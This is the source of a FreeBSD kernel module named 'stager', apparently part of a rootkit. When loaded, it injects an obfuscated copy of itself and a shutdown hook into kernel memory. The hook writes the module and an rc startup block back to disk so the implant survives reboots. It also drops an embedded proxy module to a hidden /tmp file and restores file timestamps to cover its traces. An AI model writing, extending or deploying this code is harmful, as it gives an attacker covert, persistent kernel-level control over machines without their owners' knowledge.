#include <sys/param.h>
#include <sys/types.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/libkern.h>
#include <sys/errno.h>
#include <sys/malloc.h>
#include <sys/syscallsubr.h>
#include <sys/eventhandler.h>
#include <sys/stat.h>
#include <sys/fcntl.h>
#include <sys/linker.h>

#include <vm/vm.h>
#include <vm/vm_param.h>
#include <vm/pmap.h>
#include <vm/vm_object.h>
#include <vm/vm_page.h>
#include <vm/vm_extern.h>
#include <vm/vm_kern.h>
#include <vm/vm_map.h>

#include "persist.h"
#include "config.h"
#include "self.h"
#include "times.h"
#include "rc.h"
#include "proxy_blob.h"
#include "injector.h"
#include "ehook.h"

#define HANDLER_COPY 1024
#define tmppathprefix "/tmp/."
#define tmphex 16

// NEW: random path to put in tmp 
static
void tmp_path (char* buf, size len)
{
	static const char hex[] = "0123456789abcdef";
	unsigned char rnd[tmphex/2];

	arc4random_buf(rnd, sizeof(rnd));
	size off = snprintf(buf, len, "%s", tmppathprefix);
	for (size i=0; i<sizeof(rnd); i++)
		off += snprintf(buf+off, len-off, "%c%c", hex[rnd[i]>>4], hex[rnd[i]&15]);
}

static
int proxy_load (void)
{
	struct thread* td = curthread;
	const char* path = "/tmp/.sp.ko";

	if (proxy_len==0)
		return (0);

	int error = kern_openat(td, AT_FDCWD, path, UIO_SYSSPACE,
	    O_WRONLY|O_CREAT|O_TRUNC, 0600);
	if (error!=0)
		return (error);

	int fd = td->td_retval[0];
	struct iovec iov = {
		.iov_base = __DECONST(void*, proxy_blob),
		.iov_len = proxy_len
	};
	struct uio uio = {
		.uio_iov = &iov,
		.uio_iovcnt = 1,
		.uio_offset = 0,
		.uio_resid = proxy_len,
		.uio_segflg = UIO_SYSSPACE,
		.uio_rw = UIO_WRITE,
		.uio_td = td
	};

	error = kern_pwritev(td, fd, &uio, 0);
	kern_close(td, fd);
	return (error);
}

// build and inject our tiny vm_object. for more information check readme
// contains shutdown handler, the ctx struct it needs, saved obf'd stager (its xored idgaf)
// generated rcblock and the two paths
static
int deploy (void)
{
	void* modulebuf = NULL;
	size modulelen = 0;
	struct injector code;
	int error = read_self(find_self(), &modulebuf, &modulelen);

	if (error!=0)
		return (error);

	error = stager_stat_times();
	if (error!=0)
		return (error);

	char tmp[32];
	tmp_path(tmp, sizeof(tmp));
	const char* tmpname = tmp+strlen(tmppathprefix)-1;
	char rcblock[2048];
	rcblock_build(rcblock, sizeof(rcblock), modulelen, tmp, tmpname);
	const char* helperdata = rcblock;
	size helperlen = strlen(helperdata);
	size codelen = HANDLER_COPY;

	error = injector_alloc(&code, INJECTOR_PMAP, PAGE_SIZE);
	if (error!=0) return (error);

	error = injector_write(&code, 0, (void*)persist_handler, codelen);
	if (error!=0) return (error);

	error = injector_rx(&code);

	if (error!=0) return (error);

	size dataoff = round_page(sizeof(PersistCtx));
	size helpoff = round_page(dataoff+modulelen);
	size helperpathoff = round_page(helpoff+helperlen);
	size delimoff = round_page(helperpathoff+strlen(CFG_HELPER_PATH)+1);
	size total = round_page(delimoff+RMAGIC_LEN);

	struct injector data;
	error = injector_alloc(&data, INJECTOR_VMOBJ, total);
	if (error!=0) {
		free(modulebuf, M_TEMP);
		return (error);
	}

	for (size i=0; i<modulelen; i++)
		((unsigned char*)modulebuf)[i] ^= (unsigned char)modulelen;

	PersistCtx* ctx = (PersistCtx *)(data.kva);
	ctx->module_data = (void*)(data.kva+dataoff);
	ctx->module_len = modulelen;
	ctx->helper_path = (const char*)(data.kva+helperpathoff);
	ctx->helper_data = (void*)(data.kva+helpoff);
	ctx->helper_len = helperlen;
	ctx->delim = (const char*)(data.kva+delimoff);
	ctx->delim_len = RMAGIC_LEN;
	ctx->openat = kern_openat;
	ctx->pwritev = kern_pwritev;
	ctx->close = kern_close;

	(void)injector_write(&data, dataoff, modulebuf, modulelen);
	(void)injector_write(&data, helpoff, helperdata, helperlen);
	(void)injector_write(&data, helperpathoff, CFG_HELPER_PATH, strlen(CFG_HELPER_PATH)+1);
	(void)injector_write(&data, delimoff, RMAGIC_LINE, RMAGIC_LEN);

	free(modulebuf, M_TEMP);

	if (ehook_on_arg("shutdown_pre_sync", (void*)code.kva, ctx, SHUTDOWN_PRI_FIRST) == NULL)
		return (ENOMEM);

	{
		(void)proxy_load();
	}

	return (0);
}

static
int stager_load (struct module * module, int cmd, void* arg)
{
	int error = 0;

	switch (cmd) {
	case MOD_LOAD:
		(void)stager_load_times();
		error = deploy();
		break;
	case MOD_UNLOAD:
		if (stager_have_times)
			stager_restore_times();
		break;
	default:
		error = EOPNOTSUPP;
		break;
	}
	return (error);
}

static moduledata_t stager_mod = { "stager", stager_load, NULL };
DECLARE_MODULE(stager, stager_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
